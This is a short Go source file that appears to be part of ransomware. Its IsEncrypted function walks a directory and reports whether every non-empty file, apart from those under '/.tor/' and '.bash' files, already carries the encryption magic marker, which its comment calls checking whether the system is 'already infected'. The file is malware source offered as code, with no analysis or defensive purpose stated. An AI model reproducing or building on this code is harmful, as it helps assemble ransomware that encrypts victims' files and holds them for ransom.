package core

import (
    "fmt"
    "log"
    "os"
    "strings"
    "path/filepath"
)

// IsEncrypted -> verify is it already infected
func IsEncrypted(dirPath string) bool {
    counter := 0

    e := filepath.Walk(dirPath, func(path string, info os.FileInfo, err error) error {
        if err != nil {
            fmt.Println("Err wrapper 1")
            log.Fatal(err)
	    }

	    if !strings.Contains(path, "/.tor/") && !strings.HasPrefix(info.Name(), ".bash") && info.Size() > int64(0) && !info.IsDir() && !verifyMagic(path) {
            counter++
	    }

	    return nil
	})

	if e != nil {
        fmt.Println("Err wrapper 2")
		log.Fatal(e)
	}

    if counter == 0 {
        return true
    }

    return false
}
